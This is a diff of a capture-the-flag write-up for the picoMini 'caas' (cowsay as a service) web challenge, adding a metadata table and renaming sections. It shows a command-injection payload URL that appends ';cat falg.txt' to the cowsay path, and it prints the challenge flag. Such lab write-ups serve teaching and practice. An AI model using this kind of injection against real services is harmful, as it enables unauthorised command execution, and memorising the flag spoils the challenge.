@@ -1,7 +1,19 @@
-# Blame Game
-Write-Up by **Mttttt** *2024-06-25*
+# caas
 
-## Task description
+| Field | Value |
+| --- | --- |
+| Platform | picoMini |
+| Category | Web Exploitation |
+| Difficulty | Medium |
+| Date | 2024-06-25 |
+| Author | Mttttt |
+
+## Overview
+
+Assess how the cowsay service passes URL input to the operating system.
+
+<details>
+<summary>Original challenge description</summary>
 
 Now presenting [cowsay as a service](https://caas.mars.picoctf.net)
 
@@ -11,7 +23,11 @@ Now presenting [cowsay as a service](https://caas.mars.picoctf.net)
 - *Category*: **Web Exploitation**
 - *Difficulty*: **Medium**
 
-## Solution 
+</details>
+
+## Analysis
+
+The application incorporated user input into a shell command.
 
 **index.js**:
 ```js
@@ -68,6 +84,6 @@ And now use command to see `falg.txt` content:
 
 `https://caas.mars.picoctf.net/cowsay/hi;cat%20falg.txt`
 
-### Answer
+## Result
 
 `picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}`
